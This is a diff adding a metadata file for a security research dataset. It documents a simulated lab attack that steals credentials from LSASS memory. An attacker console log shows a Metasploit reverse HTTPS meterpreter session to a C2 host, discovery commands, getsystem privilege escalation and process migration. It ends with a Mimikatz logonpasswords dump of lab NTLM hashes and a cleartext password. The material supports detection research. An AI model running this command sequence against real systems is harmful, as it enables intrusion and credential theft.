@@ -1,0 +1,689 @@
+title: LSASS Memory - logonpasswords (Mimikatz)
+id: a9a5e353-d77c-4b07-b449-a3f08271d899
+contributors:
+  - Jose Rodriguez @Cyb3rPandaH
+creation_date: 2023/08/15
+modification_date: 2023/08/15
+platform:
+  - Windows
+type: compound
+tags:
+description: |-
+  Datasets created while simulating a threat actor stealing credential material from the process memory of LSASS.exe.
+  Tactics covered during this simulation include:
+    - Resource development (malicious file)
+    - Execution (initial access via execution of malicious file)
+    - Discovery (System information, system owner, and processes running under NT AUTHORITY\SYSTEM)
+    - Privilege Escalation (Access token duplication)
+    - Defense Evasion (Portable execution injection)
+    - Credential Access (Logonpasswords - Mimikatz)
+
+  Host and Network data do not include the development of malicious file.
+  YouTube video with all simulation steps is available here: https://youtu.be/K06rmXHxBrI
+attack_mappings:
+  - technique: T1587
+    sub-technique: "001"
+    tactics:
+      - TA0042
+  - technique: T1608
+    sub-technique: "001"
+    tactics:
+      - TA0042
+  - technique: T1204
+    sub-technique: "002"
+    tactics:
+      - TA0002
+  - technique: T1082
+    sub-technique:
+    tactics:
+      - TA0007
+  - technique: T1033
+    sub-technique:
+    tactics:
+      - TA0007
+  - technique: T1057
+    sub-technique:
+    tactics:
+      - TA0007
+  - technique: T1134
+    sub-technique: "001"
+    tactics:
+      - TA0004
+  - technique: T1055
+    sub-technique: "002"
+    tactics:
+      - TA0005
+  - technique: T1003
+    sub-technique: "001"
+    tactics:
+      - TA0006
+notebooks:
+files:
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/LSASS_campaign_01/metasploit_logonpasswords_lsass_memory_dump_pcapng.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/LSASS_campaign_01/metasploit_logonpasswords_lsass_memory_dump_zeek_logs.zip
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/compound/LSASS_campaign_01/metasploit_logonpasswords_lsass_memory_dump.zip
+simulation:
+  environment: VirtualBox
+  tools:
+    - type: C2
+      name: Metasploit
+      module: kiwi
+      script: kiwi_cmd sekurlsa::logonpasswords
+  permissions_required:
+    - Administrator
+    - System
+  adversary_view: |-
+        ┌──(root㉿kali)-[~]
+        └─# systemctl start postgresql 
+                                                                                                                
+        ┌──(root㉿kali)-[~]
+        └─# msfdb init
+        [i] Database already started
+        [+] Creating database user 'msf'
+        [+] Creating databases 'msf'
+        [+] Creating databases 'msf_test'
+        [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+        [+] Creating initial database schema
+                                                                                                                
+        ┌──(root㉿kali)-[~]
+        └─# msfconsole -q
+        msf6 > use multi/handler
+        [*] Using configured payload generic/shell_reverse_tcp
+        msf6 exploit(multi/handler) > options
+
+        Module options (exploit/multi/handler):
+
+        Name  Current Setting  Required  Description
+        ----  ---------------  --------  -----------
+
+
+        Payload options (generic/shell_reverse_tcp):
+
+        Name   Current Setting  Required  Description
+        ----   ---------------  --------  -----------
+        LHOST                   yes       The listen address (an interface may be specified)
+        LPORT  4444             yes       The listen port
+
+
+        Exploit target:
+
+        Id  Name
+        --  ----
+        0   Wildcard Target
+
+
+
+        View the full module info with the info, or info -d command.
+
+        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+        payload => windows/x64/meterpreter/reverse_https
+        msf6 exploit(multi/handler) > set lhost 10.0.5.13
+        lhost => 10.0.5.13
+        msf6 exploit(multi/handler) > set lport 8080
+        lport => 8080
+        msf6 exploit(multi/handler) > run
+
+        [*] Started HTTPS reverse handler on https://10.0.5.13:8080
+        [*] https://10.0.5.13:8080 handling request from 10.0.5.5; (UUID: rlbadawz) Staging x64 payload (201820 bytes) ...
+        [*] Meterpreter session 1 opened (10.0.5.13:8080 -> 10.0.5.5:7711) at 2023-08-16 00:54:56 -0400
+
+        meterpreter > shell
+        Process 7588 created.
+        Channel 1 created.
+        Microsoft Windows [Version 10.0.19045.2006]
+        (c) Microsoft Corporation. All rights reserved.
+
+        C:\Users\stevie.marie\Downloads>systeminfo
+        systeminfo
+
+        Host Name:                 MKT01
+        OS Name:                   Microsoft Windows 10 Enterprise Evaluation
+        OS Version:                10.0.19045 N/A Build 19045
+        OS Manufacturer:           Microsoft Corporation
+        OS Configuration:          Member Workstation
+        OS Build Type:             Multiprocessor Free
+        Registered Owner:          stevie
+        Registered Organization:   
+        Product ID:                00329-20000-00001-AA176
+        Original Install Date:     8/8/2023, 10:32:53 PM
+        System Boot Time:          8/15/2023, 7:12:01 PM
+        System Manufacturer:       innotek GmbH
+        System Model:              VirtualBox
+        System Type:               x64-based PC
+        Processor(s):              1 Processor(s) Installed.
+                                [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~2404 Mhz
+        BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
+        Windows Directory:         C:\Windows
+        System Directory:          C:\Windows\system32
+        Boot Device:               \Device\HarddiskVolume1
+        System Locale:             en-us;English (United States)
+        Input Locale:              en-us;English (United States)
+        Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+        Total Physical Memory:     4,096 MB
+        Available Physical Memory: 1,887 MB
+        Virtual Memory: Max Size:  5,504 MB
+        Virtual Memory: Available: 3,558 MB
+        Virtual Memory: In Use:    1,946 MB
+        Page File Location(s):     C:\pagefile.sys
+        Domain:                    pandalab.com
+        Logon Server:              N/A
+        Hotfix(s):                 5 Hotfix(s) Installed.
+                                [01]: KB5017022
+                                [02]: KB5015684
+                                [03]: KB5017308
+                                [04]: KB5014032
+                                [05]: KB5016705
+        Network Card(s):           1 NIC(s) Installed.
+                                [01]: Intel(R) PRO/1000 MT Desktop Adapter
+                                        Connection Name: Ethernet
+                                        DHCP Enabled:    Yes
+                                        DHCP Server:     192.168.1.4
+                                        IP address(es)
+                                        [01]: 192.168.1.41
+                                        [02]: fe80::5d91:ea18:e2b5:9755
+        Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+        C:\Users\stevie.marie\Downloads>whoami & whoami /groups
+        whoami & whoami /groups
+        pandalab\pedro.gustavo
+
+        GROUP INFORMATION
+        -----------------
+
+        Group Name                                      Type             SID                                           Attributes                                                     
+        =============================================== ================ ============================================= ===============================================================
+        Everyone                                        Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group             
+        BUILTIN\Users                                   Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group             
+        BUILTIN\Administrators                          Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+        NT AUTHORITY\INTERACTIVE                        Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group             
+        CONSOLE LOGON                                   Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group             
+        NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group             
+        NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group             
+        LOCAL                                           Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group             
+        PANDALAB\Domain Admins                          Group            S-1-5-21-1939123204-1418869057-2368897034-512 Mandatory group, Enabled by default, Enabled group             
+        Authentication authority asserted identity      Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group             
+        PANDALAB\Denied RODC Password Replication Group Alias            S-1-5-21-1939123204-1418869057-2368897034-572 Mandatory group, Enabled by default, Enabled group, Local Group
+        Mandatory Label\High Mandatory Level            Label            S-1-16-12288                                                                                                 
+
+        C:\Users\stevie.marie\Downloads>tasklist /fo table /svc /fi "USERNAME eq NT AUTHORITY\SYSTEM"
+        tasklist /fo table /svc /fi "USERNAME eq NT AUTHORITY\SYSTEM"                                                                                                
+                                                                                                                                                                
+        Image Name                     PID Services                                                                                                                  
+        ========================= ======== ============================================                                                                              
+        System Idle Process              0 N/A                                                                                                                       
+        Registry                        72 N/A                                                                                                                       
+        smss.exe                       352 N/A                                                                                                                       
+        csrss.exe                      444 N/A                                                                                                                       
+        wininit.exe                    512 N/A                                                                                                                       
+        csrss.exe                      520 N/A                                                                                                                       
+        winlogon.exe                   564 N/A                                                                                                                       
+        services.exe                   604 N/A                                                                                                                       
+        lsass.exe                      628 KeyIso, Netlogon, SamSs, VaultSvc           
+        svchost.exe                    736 BrokerInfrastructure, DcomLaunch, PlugPlay, 
+                                        Power, SystemEventsBroker                   
+        svchost.exe                    896 LSM                                         
+        svchost.exe                    408 NcbService                                  
+        svchost.exe                   1140 Schedule                                    
+        svchost.exe                   1232 ProfSvc                                     
+        svchost.exe                   1400 UserManager                                 
+        VBoxService.exe               1564 VBoxService                                 
+        svchost.exe                   1680 SysMain                                     
+        svchost.exe                   1692 Themes                                      
+        Memory Compression            1776 N/A                                         
+        svchost.exe                   1812 SENS                                        
+        svchost.exe                   1868 AudioEndpointBuilder                        
+        svchost.exe                   1956 Winmgmt                                     
+        svchost.exe                   1768 iphlpsvc                                    
+        svchost.exe                   2136 ShellHWDetection                            
+        spoolsv.exe                   2268 Spooler                                     
+        svchost.exe                   2316 StateRepository                             
+        svchost.exe                   2456 DiagTrack                                   
+        svchost.exe                   2488 LanmanServer                                
+        svchost.exe                   2568 TrkWks                                      
+        MsMpEng.exe                   2580 WinDefend                                   
+        wlms.exe                      2596 WLMS                                        
+        svchost.exe                   2612 WpnService                                  
+        Sysmon.exe                    2620 Sysmon                                      
+        svchost.exe                   2876 RasMan                                      
+        unsecapp.exe                  3076 N/A                                         
+        svchost.exe                   3300 wuauserv                                    
+        svchost.exe                   3740 StorSvc                                     
+        MicrosoftEdgeUpdate.exe       4020 N/A                                         
+        svchost.exe                   4164 TabletInputService                          
+        svchost.exe                   4240 TokenBroker                                 
+        svchost.exe                   4612 DsmSvc                                      
+        SearchIndexer.exe             4528 WSearch                                     
+        SecurityHealthService.exe     5864 SecurityHealthService                       
+        svchost.exe                   5680 PcaSvc                                      
+        SgrmBroker.exe                2324 SgrmBroker                                  
+        svchost.exe                   6108 Appinfo                                     
+        svchost.exe                   5764 UsoSvc                                      
+        svchost.exe                   6432 WaaSMedicSvc                                
+        svchost.exe                   1204 WbioSrvc                                    
+        svchost.exe                   3720 AppXSvc                                     
+        CompatTelRunner.exe           2588 N/A                                         
+        conhost.exe                   7248 N/A                                         
+        MoUsoCoreWorker.exe           7636 N/A                                         
+        svchost.exe                   7924 InstallService                              
+        WmiPrvSE.exe                  8068 N/A                                         
+        SearchProtocolHost.exe        4816 N/A                                         
+        svchost.exe                   4604 wlidsvc                                     
+        WmiPrvSE.exe                   220 N/A                                         
+        SearchFilterHost.exe          7864 N/A                                         
+        TrustedInstaller.exe          1876 TrustedInstaller                            
+        TiWorker.exe                  5700 N/A                                         
+        svchost.exe                   7216 WdiSystemHost                               
+        CompatTelRunner.exe           8160 N/A                                         
+
+        C:\Users\stevie.marie\Downloads>exit
+        exit
+        meterpreter > background 
+        [*] Backgrounding session 1...
+        msf6 exploit(multi/handler) > use post/windows/escalate/getsystem
+        msf6 post(windows/escalate/getsystem) > info
+
+        Name: Windows Escalation
+        Module: post/windows/escalate/getsystem
+        Platform: Windows
+        Arch: 
+        Rank: Normal
+
+        Provided by:
+        hdm <x@hdm.io>
+
+        Compatible session types:
+        Meterpreter
+
+        Basic options:
+        Name       Current Setting  Required  Description
+        ----       ---------------  --------  -----------
+        SESSION                     yes       The session to run this module on
+        TECHNIQUE  0                no        Specify a particular technique to use (1-6), otherwise try them all
+
+        Description:
+        This module uses the `getsystem` command to escalate the current session to the SYSTEM account using various
+        techniques.
+
+        Also known as:
+        Named Pipe Impersonation
+        Token Duplication
+        RPCSS
+        PrintSpooler
+        EFSRPC
+        EfsPotato
+
+
+        View the full module info with the info -d command.
+
+        msf6 post(windows/escalate/getsystem) > set session 1
+        session => 1
+        msf6 post(windows/escalate/getsystem) > set technique 2
+        technique => 2
+        msf6 post(windows/escalate/getsystem) > run
+
+        [+] Obtained SYSTEM via technique 2
+        [*] Post module execution completed
+        msf6 post(windows/escalate/getsystem) > sessions -i 1
+        [*] Starting interaction with 1...
+
+        meterpreter > shell
+        Process 6924 created.
+        Channel 2 created.
+        Microsoft Windows [Version 10.0.19045.2006]
+        (c) Microsoft Corporation. All rights reserved.
+
+        C:\Windows\system32>whoami
+        whoami
+        nt authority\system
+
+        C:\Windows\system32>exit
+        exit
+        meterpreter > migrate 1400
+        [*] Migrating from 1988 to 1400...
+        [*] Migration completed successfully.
+        meterpreter > load kiwi
+        Loading extension kiwi...
+        .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+        ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+        '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+        '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+        Success.
+        meterpreter > kiwi_cmd sekurlsa::logonpasswords
+
+        Authentication Id : 0 ; 12651791 (00000000:00c10d0f)
+        Session           : CachedInteractive from 1
+        User Name         : pedro.gustavo
+        Domain            : PANDALAB
+        Logon Server      : DC01
+        Logon Time        : 8/15/2023 9:54:30 PM
+        SID               : S-1-5-21-1939123204-1418869057-2368897034-1105
+                msv :
+                [00000003] Primary
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB
+                * NTLM     : 08ec3a969279991505b34da7e6a0f431
+                * SHA1     : dfadefba1b8478e3a91df6f77f635b52f7aa7729
+                * DPAPI    : 2eb98d35cc99cd837ca0ad6eb3a0f6b2
+                tspkg :
+                wdigest :
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB.COM
+                * Password : (null)
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 9012736 (00000000:00898600)
+        Session           : CachedInteractive from 1
+        User Name         : pedro.gustavo
+        Domain            : PANDALAB
+        Logon Server      : DC01
+        Logon Time        : 8/10/2023 7:21:32 AM
+        SID               : S-1-5-21-1939123204-1418869057-2368897034-1105
+                msv :
+                [00000003] Primary
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB
+                * NTLM     : 08ec3a969279991505b34da7e6a0f431
+                * SHA1     : dfadefba1b8478e3a91df6f77f635b52f7aa7729
+                * DPAPI    : 2eb98d35cc99cd837ca0ad6eb3a0f6b2
+                tspkg :
+                wdigest :
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB.COM
+                * Password : P3dr0Gust@v02023
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 8882078 (00000000:0087879e)
+        Session           : CachedInteractive from 1
+        User Name         : pedro.gustavo
+        Domain            : PANDALAB
+        Logon Server      : DC01
+        Logon Time        : 8/10/2023 7:20:09 AM
+        SID               : S-1-5-21-1939123204-1418869057-2368897034-1105
+                msv :
+                [00000003] Primary
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB
+                * NTLM     : 08ec3a969279991505b34da7e6a0f431
+                * SHA1     : dfadefba1b8478e3a91df6f77f635b52f7aa7729
+                * DPAPI    : 2eb98d35cc99cd837ca0ad6eb3a0f6b2
+                tspkg :
+                wdigest :
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB.COM
+                * Password : P3dr0Gust@v02023
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 8498517 (00000000:0081ad55)
+        Session           : CachedInteractive from 1
+        User Name         : pedro.gustavo
+        Domain            : PANDALAB
+        Logon Server      : DC01
+        Logon Time        : 8/10/2023 7:15:45 AM
+        SID               : S-1-5-21-1939123204-1418869057-2368897034-1105
+                msv :
+                [00000003] Primary
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB
+                * NTLM     : 08ec3a969279991505b34da7e6a0f431
+                * SHA1     : dfadefba1b8478e3a91df6f77f635b52f7aa7729
+                * DPAPI    : 2eb98d35cc99cd837ca0ad6eb3a0f6b2
+                tspkg :
+                wdigest :
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : pedro.gustavo
+                * Domain   : PANDALAB.COM
+                * Password : P3dr0Gust@v02023
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 405293 (00000000:00062f2d)
+        Session           : Interactive from 1
+        User Name         : stevie.marie
+        Domain            : PANDALAB
+        Logon Server      : DC01
+        Logon Time        : 8/10/2023 4:59:15 AM
+        SID               : S-1-5-21-1939123204-1418869057-2368897034-1106
+                msv :
+                [00000003] Primary
+                * Username : stevie.marie
+                * Domain   : PANDALAB
+                * NTLM     : a9ef4276cee5c5e55cb28a8eb7520d47
+                * SHA1     : 4b8c953c57e5a4d8daa7d464dbd3333572b8ed1c
+                * DPAPI    : 6bae194bbee33a7268be2e29e5e2441e
+                tspkg :
+                wdigest :
+                * Username : stevie.marie
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : stevie.marie
+                * Domain   : PANDALAB.COM
+                * Password : (null)
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 997 (00000000:000003e5)
+        Session           : Service from 0
+        User Name         : LOCAL SERVICE
+        Domain            : NT AUTHORITY
+        Logon Server      : (null)
+        Logon Time        : 8/10/2023 4:58:46 AM
+        SID               : S-1-5-19
+                msv :
+                tspkg :
+                wdigest :
+                * Username : (null)
+                * Domain   : (null)
+                * Password : (null)
+                kerberos :
+                * Username : (null)
+                * Domain   : (null)
+                * Password : (null)
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 59021 (00000000:0000e68d)
+        Session           : Interactive from 1
+        User Name         : DWM-1
+        Domain            : Window Manager
+        Logon Server      : (null)
+        Logon Time        : 8/10/2023 4:58:46 AM
+        SID               : S-1-5-90-0-1
+                msv :
+                [00000003] Primary
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * NTLM     : d152ea7fad44da6b69ac3a2a5e63625a
+                * SHA1     : d8314e38c12fa619781722928ae83aff0abc9dc6
+                tspkg :
+                wdigest :
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : MKT01$
+                * Domain   : pandalab.com
+                * Password : PGif%a`C,(GPM^9_KjMSK!W7v$<CQT@zj6<A)>RH>>Lr@"S6jT,bk-d"g6gCWk)wFK?P4Rk2 ]F]n[.Fp)YO@IuMi.7`)uvq'%!4/@IlAzmk).PX,Ws6.a&o
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 58649 (00000000:0000e519)
+        Session           : Interactive from 1
+        User Name         : DWM-1
+        Domain            : Window Manager
+        Logon Server      : (null)
+        Logon Time        : 8/10/2023 4:58:46 AM
+        SID               : S-1-5-90-0-1
+                msv :
+                [00000003] Primary
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * NTLM     : d152ea7fad44da6b69ac3a2a5e63625a
+                * SHA1     : d8314e38c12fa619781722928ae83aff0abc9dc6
+                tspkg :
+                wdigest :
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : MKT01$
+                * Domain   : pandalab.com
+                * Password : PGif%a`C,(GPM^9_KjMSK!W7v$<CQT@zj6<A)>RH>>Lr@"S6jT,bk-d"g6gCWk)wFK?P4Rk2 ]F]n[.Fp)YO@IuMi.7`)uvq'%!4/@IlAzmk).PX,Ws6.a&o
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 996 (00000000:000003e4)
+        Session           : Service from 0
+        User Name         : MKT01$
+        Domain            : PANDALAB
+        Logon Server      : (null)
+        Logon Time        : 8/10/2023 4:58:45 AM
+        SID               : S-1-5-20
+                msv :
+                [00000003] Primary
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * NTLM     : d152ea7fad44da6b69ac3a2a5e63625a
+                * SHA1     : d8314e38c12fa619781722928ae83aff0abc9dc6
+                tspkg :
+                wdigest :
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : mkt01$
+                * Domain   : PANDALAB.COM
+                * Password : (null)
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 35995 (00000000:00008c9b)
+        Session           : Interactive from 0
+        User Name         : UMFD-0
+        Domain            : Font Driver Host
+        Logon Server      : (null)
+        Logon Time        : 8/10/2023 4:58:44 AM
+        SID               : S-1-5-96-0-0
+                msv :
+                [00000003] Primary
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * NTLM     : d152ea7fad44da6b69ac3a2a5e63625a
+                * SHA1     : d8314e38c12fa619781722928ae83aff0abc9dc6
+                tspkg :
+                wdigest :
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : MKT01$
+                * Domain   : pandalab.com
+                * Password : PGif%a`C,(GPM^9_KjMSK!W7v$<CQT@zj6<A)>RH>>Lr@"S6jT,bk-d"g6gCWk)wFK?P4Rk2 ]F]n[.Fp)YO@IuMi.7`)uvq'%!4/@IlAzmk).PX,Ws6.a&o
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 35910 (00000000:00008c46)
+        Session           : Interactive from 1
+        User Name         : UMFD-1
+        Domain            : Font Driver Host
+        Logon Server      : (null)
+        Logon Time        : 8/10/2023 4:58:44 AM
+        SID               : S-1-5-96-0-1
+                msv :
+                [00000003] Primary
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * NTLM     : d152ea7fad44da6b69ac3a2a5e63625a
+                * SHA1     : d8314e38c12fa619781722928ae83aff0abc9dc6
+                tspkg :
+                wdigest :
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : MKT01$
+                * Domain   : pandalab.com
+                * Password : PGif%a`C,(GPM^9_KjMSK!W7v$<CQT@zj6<A)>RH>>Lr@"S6jT,bk-d"g6gCWk)wFK?P4Rk2 ]F]n[.Fp)YO@IuMi.7`)uvq'%!4/@IlAzmk).PX,Ws6.a&o
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 34049 (00000000:00008501)
+        Session           : UndefinedLogonType from 0
+        User Name         : (null)
+        Domain            : (null)
+        Logon Server      : (null)
+        Logon Time        : 8/10/2023 4:58:44 AM
+        SID               : 
+                msv :
+                [00000003] Primary
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * NTLM     : d152ea7fad44da6b69ac3a2a5e63625a
+                * SHA1     : d8314e38c12fa619781722928ae83aff0abc9dc6
+                tspkg :
+                wdigest :
+                kerberos :
+                ssp :
+                credman :
+                cloudap :
+
+        Authentication Id : 0 ; 999 (00000000:000003e7)
+        Session           : UndefinedLogonType from 0
+        User Name         : MKT01$
+        Domain            : PANDALAB
+        Logon Server      : (null)
+        Logon Time        : 8/10/2023 4:58:44 AM
+        SID               : S-1-5-18
+                msv :
+                tspkg :
+                wdigest :
+                * Username : MKT01$
+                * Domain   : PANDALAB
+                * Password : (null)
+                kerberos :
+                * Username : mkt01$
+                * Domain   : PANDALAB.COM
+                * Password : (null)
+                ssp :
+                credman :
+                cloudap :
+references:
+  - https://www.offsec.com/metasploit-unleashed/mimikatz/
+  - https://youtube.com/playlist?list=PLHj4xFI1LxMsYLOfBz2PmBZyLeNeOT6vJ
+  - https://youtu.be/K06rmXHxBrI
+  - https://attack.mitre.org/techniques/T1003/001/
